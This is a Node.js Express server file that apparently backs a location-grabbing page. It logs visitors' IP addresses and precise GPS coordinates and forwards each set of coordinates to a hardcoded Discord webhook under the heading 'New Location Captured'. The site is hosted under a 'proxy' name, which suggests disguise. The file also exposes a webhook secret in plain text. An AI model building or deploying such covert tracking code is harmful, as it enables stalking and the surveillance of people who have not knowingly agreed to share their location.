const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 10000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from current directory
app.use(express.static(__dirname));

// Root route - serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Location API endpoint
app.post('/api/location', (req, res) => {
  const locationData = req.body;
  const timestamp = new Date().toISOString();
  
  console.log('='.repeat(50));
  console.log(`[LOCATION] ${timestamp}`);
  console.log(`  IP: ${req.ip || 'unknown'}`);
  console.log(`  Latitude: ${locationData.latitude}`);
  console.log(`  Longitude: ${locationData.longitude}`);
  console.log(`  Accuracy: ${locationData.accuracy} meters`);
  console.log('='.repeat(50));
  
  res.json({ status: 'ok', message: 'Location received' });
});

// Discord webhook endpoint
app.post('/api/location/discord', (req, res) => {
  const locationData = req.body;
  const discordWebhook = 'https://discord.com/api/webhooks/1481421187211858021/ouKVnU8Zage6vToMZQ4aqRHKMp2ZsuYgGqit9i3Wqwr2L4H1bzsOVy6xrtXFl0fS7Eaw';
  
  const message = {
    content: `New Location Captured\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}m\nTime: ${locationData.timestamp}`
  };
  
  fetch(discordWebhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(message)
  }).catch(e => console.log('Discord error:', e));
  
  res.json({ status: 'ok' });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.send('ok');
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Visit https://proxy-nhno.onrender.com/`);
});
